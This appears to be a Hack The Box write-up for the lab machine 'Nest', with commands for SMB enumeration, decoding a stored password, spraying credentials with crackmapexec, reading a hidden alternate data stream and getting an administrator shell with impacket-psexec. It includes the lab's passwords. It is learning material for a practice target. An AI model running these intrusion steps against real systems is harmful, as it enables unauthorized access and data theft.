# Nest Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -p- -oA fullnest 10.10.10.178``

445/tcp  open  microsoft-ds

4386/tcp open  unknown


``telnet 10.10.10.178 4386``

HQK Reporting Service V1.2

![image](https://user-images.githubusercontent.com/123066149/219978012-ef2de3c1-ee16-4f12-a81d-e5d1c908e88e.png)

# ${{\color{purple}Initial Foothold}}\ $

``smbclient -U 'guest%' -L //10.10.10.178``  **:white_check_mark:**

![nest](https://user-images.githubusercontent.com/123066149/219977952-10bf82e2-17dd-4847-9662-7c0574cb3f03.PNG)

``smbmap -u 'guest%' -p '' -H 10.10.10.178``

![nest2](https://user-images.githubusercontent.com/123066149/219977955-11587394-53bb-4003-96db-4444483d1f9e.PNG)

``tree -f``

![nest6](https://user-images.githubusercontent.com/123066149/219978096-f7d14d29-972e-4762-bcc1-762285d76e56.PNG)

### After a good enumeration I found a password in the share :

![nest7](https://user-images.githubusercontent.com/123066149/219978134-ceda178d-80e0-486f-93b5-12f9d74e7f05.PNG)

### The password was in vb format i used this site to decode it :

https://dotnetfiddle.net/LdhDaa

### See the difference in rights on the share:

``crackmapexec smb 10.10.10.178 -u 'seazeaz' -p 'azeazeazee'`` 

``crackmapexec smb 10.10.10.178 --shares -u 'TempUser' -p 'welcome2019'``

``crackmapexec smb 10.10.10.178 --shares -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx'``

![image](https://user-images.githubusercontent.com/123066149/219978197-a0d102f9-3279-4ff7-a4e8-f5e79fe3eae2.png)

### Replay the password for other users :

``crackmapexec smb 10.10.10.178 -u users.lst -p welcome2019 --continue-on-success``

![nest3](https://user-images.githubusercontent.com/123066149/219978170-7567d458-4be6-4c03-9a94-38b500e6ef36.PNG)

### In a file named "Debug Mode Password.txté" I had to do a special command to find the password :

``allinfo "Debug Mode Password.txt``

``get "Debug Mode Password.txt":Password``

``cat Debug Mode Password.txt``

![nest4](https://user-images.githubusercontent.com/123066149/219978395-27c5720e-def1-46ee-8006-cfeb6154147d.PNG)

# ${{\color{purple}Exploitation}}\ $ 

### I have created directories and I mounted the share in the files to make a better enumeration :

``mkdir C.Smith``

``mkdir L.Frost``

``mkdir R.Thompson``

``mkdir TempUser``

``mount -t cifs -o 'username=L.Frost,password=welcom2019' //10.10.10.178/Users /mnt/L.Frost``

``mount -t cifs //10.10.10.178/Data /mnt/tmpuser -o "username=TempUser,password=welcome2019"``

``find .``  

### OR to exploit the structure

``tree -f``

# ${{\color{purple}Privilege Escalation}}\ $

``telnet 10.10.10.178 4386``

HQK Reporting Service V1.2

![nest9](https://user-images.githubusercontent.com/123066149/219978750-0df318a5-091d-4117-b511-1929e1a5637e.PNG)

![nest10](https://user-images.githubusercontent.com/123066149/219978754-492ceb49-2465-4b0b-a73d-5b066e660b46.PNG)

![nest11](https://user-images.githubusercontent.com/123066149/219978757-1e3f2a5e-e0a6-4f1f-9932-31d16f3defb1.PNG)

### The password was in vb format i used this site to decode it :

https://dotnetfiddle.net/LdhDaa

``/usr/bin/impacket-psexec administrator@10.10.10.178``

![nest5](https://user-images.githubusercontent.com/123066149/219978802-4d6431df-f61c-4545-b87e-256f69e4c39b.PNG)


# ${{\color{purple}Points of Improvement}}\ $

* Use crackmap for shares
* Mounter the shares on my computer for a perfect enumeration 
* Test the open ports with telent nc and netcat because they don't send the same data 
* Think about the ``allinfo`` method of smb commands for interesting files 
* Use the tree -f command for enumeration
* It's possible to retrieve all files from a share with the following smb commands

``allinfo "Debug Mode Password.txt`` 
``echo -n yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4= |base64 -d`` ### Base64 decode
``tree -f``

``smb: \> mask ""``
``smb: \> recurse``
``smb: \> prompt``
``smb: \> mget *``

